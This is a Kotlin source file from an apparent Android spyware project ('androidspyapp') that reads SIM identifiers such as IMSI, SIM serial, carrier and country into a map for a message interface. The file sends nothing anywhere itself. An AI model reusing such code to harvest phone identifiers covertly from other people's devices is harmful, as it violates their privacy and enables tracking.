package com.komnacki.androidspyapp.device.sim

import android.content.Context
import com.komnacki.androidspyapp.Message
import github.nisrulz.easydeviceinfo.base.EasySimMod

class SimState(override var context: Context) :
    Message {
    init {
        getSimState(
            context
        )
    }

    companion object {
        private val info : MutableMap<String, Any> = mutableMapOf()

        fun getSimState(context: Context) {
            val easySimMod = EasySimMod(context)
            try {
                info["IMSI"] = easySimMod.imsi
                info["SERIAL"] = easySimMod.simSerial
                info["INFO"] = easySimMod.activeMultiSimInfo
                info["IS_MULTI_SIM"] = easySimMod.isMultiSim
                info["NUMBER_OF_ACTIVE"] = easySimMod.numberOfActiveSim
            } catch (e : SecurityException) {
                info["IMSI"] = "Undefined"
                info["SERIAL"] = "Undefined"
                info["INFO"] = "Undefined"
                info["IS_MULTI_SIM"] = "Undefined"
                info["NUMBER_OF_ACTIVE"] = "Undefined"
            }
            info["COUNTRY"] = easySimMod.country
            info["CARRIER"] = easySimMod.carrier
            info["IS_LOCKED"] = easySimMod.isSimNetworkLocked
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}